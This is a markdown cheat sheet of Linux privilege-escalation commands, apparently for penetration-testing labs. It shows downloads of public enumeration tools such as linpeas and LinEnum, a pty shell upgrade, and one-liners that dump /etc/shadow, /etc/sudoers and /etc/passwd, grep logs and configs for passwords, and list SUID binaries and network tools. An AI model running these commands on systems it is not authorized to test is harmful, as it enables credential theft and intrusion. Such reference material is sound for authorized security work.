## Command summary - Linux Privilege Escalation

### Automation
[Linpeas](https://github.com/carlospolop/PEASS-ng/releases/latest)
```bash
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
```
> Other
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
        ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
sudo git clone https://github.com/diego-treitos/linux-smart-enumeration /opt/linux-smart-enumeration
        wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
        curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
        ./lse.sh -l1 # shows interesting information that should help you to privesc
        ./lse.sh -l2 # dump all the information it gathers about the system
sudo git clone https://github.com/belane/linux-soft-exploit-suggester /opt/linux-soft-exploit-suggester
sudo git clone https://github.com/jondonas/linux-exploit-suggester-2 /opt/linux-exploit-suggester-2
sudo git clone https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py /opt/linuxprivchecker
sudo git clone https://github.com/liamg/traitor /opt/traitor # automated tool not OSCP-Friendly
```


### Interactive shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
### update variables
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp && export TERM=xterm-256color && alias ll='ls -lsaht --color=auto'
```

### sort terminal

```
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

### one liner enum rough n ready:

```bash

## host intel
echo "OS: " && cat /etc/issue  && echo "KERNEL: " && cat /proc/version && echo "HOSTNAME: " && hostname && echo "ENV: " && env 2>/dev/null | grep -v 'LS_COLORS' 

## user intel
echo "WHOAMI: " && whoami  && echo "ID: " && id && echo "ALLUSERS: " && cat /etc/passwd  && echo "SUPUSERS: " && grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}' && echo "SUDOERS: " && cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null && echo "LOGGEDIN: " && who -a 2>/dev/null

## network intel
echo "NETUP: " && netstat -antup && echo "NETSTAT: " && netstat -antup | grep -v 'TIME_WAIT'

## files and directory intel

echo "CRON: " && ls -la /etc/cron* 2>/dev/null && echo "CRONW: " && ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null && echo "CRONU: " && crontab -l 2>/dev/null


echo "WWDIRSROOT: " && find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root && echo "WWDIRS: " && find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root && echo "WWFILES: " && find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null

echo "SUID: " && find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null

echo "ROOTHOME: " && ls -ahlR /root 2>/dev/null

## passwords

echo "LOGPWDS: " && find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null
echo "CONFPWDS: " && find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null
echo "SHADOW: " && cat /etc/shadow 2>/dev/null

## Other
echo "SUDO: " && sudo -V | grep version 2>/dev/null && echo "TOOLS: " && which socat nc.traditional awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```



### one liner enum with variables
```bash
OS=$(cat /etc/issue) && KERNEL=$(cat /proc/version) && HOSTNAME=$(hostname) && ENV=$(env 2>/dev/null | grep -v 'LS_COLORS') && WHOAMI=$(whoami) && ID=$(id) && ALLUSERS=$(cat /etc/passwd) && SUPUSERS=$(grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}') && SUDOERS=$(cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null) && LOGGEDIN=$(who -a 2>/dev/null) && netup=$(netstat -antup) && NETSTAT=$(netstat -antup | grep -v 'TIME_WAIT') && CRON=$(ls -la /etc/cron* 2>/dev/null) && CRONW=$(ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null) && CRONU=$(crontab -l 2>/dev/null) && WWDIRSROOT=$(find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root) && WWDIRS=$(find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root) && WWFILES=$(find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null) && SUID=$(find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null) && ROOTHOME=$(ls -ahlR /root 2>/dev/null) && LOGPWDS=$(find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null) && CONFPWDS=$(find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null) && SHADOW=$(cat /etc/shadow 2>/dev/null) SUDO=$(sudo -V | grep version 2>/dev/null) && TOOLS=$(which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null)
```

> Env & Users
```bash
echo " : : : : : : " && echo " : : : : : : " && echo "ENVIROMENT & USERS : " && echo " : : : : : : " && echo "OS: $OS" && echo " Kernel: $KERNEL" && echo "Hostname: $HOSTNAME" && echo "Environment: $ENV" && echo "Your User: $WHOAMI" && echo "User groups: $ID" && echo "UserList: $ALLUSERS" && echo "Superusers: $SUPUSERS" && echo "Sudoers: $SUDOERS" && echo "WhosLoggedIn: $LOGGEDIN" && echo " : : : : : : " && echo " : : : : : : "  && echo "NETWORKING: "  && echo " : : : : : : " && echo "Network: $netup" && echo "OpenPorts: $NETSTAT" && echo " : : : : : : " && echo " : : : : : : "  && echo "CRON & SUDO: " && echo " : : : : : : " && echo "CronJobs: $CRON" && echo "Cron: $CRONW" && echo "YourCron: $CRONU" && echo "Listed Tools: $TOOLS" && echo "ShadowFile: $SHADOW" && echo "SudoMakeMeASandwich: $SUDO" && echo " : : : : : : "  && echo " :  T H E  : " && echo " : : : : : : "  && echo ":   E N D  : " && echo " : : : : : : " 
```
> Files & Directories
```bash
echo " : : : : : : " && echo " : : : : : : " && echo "FILES DIRECTORIES INSIDE FILES: " && echo " : : : : : : " && echo "WorldWriteDirsRoot: $WWDIRSROOT" && echo "WorldWriteDirs: $WWDIRS" && echo "WorldWriteFiles: $WWFILES" && echo "SUIDBinaries: $SUID" && echo "RootHome: $ROOTHOME" && echo "PasswordsLogs: $LOGPWDS" && echo "PasswordsConfigs: $CONFPWDS" && echo " : : : : : : "  && echo " :  T H E  : " && echo " : : : : : : "  && echo ":   E N D  : " && echo " : : : : : : " 

```

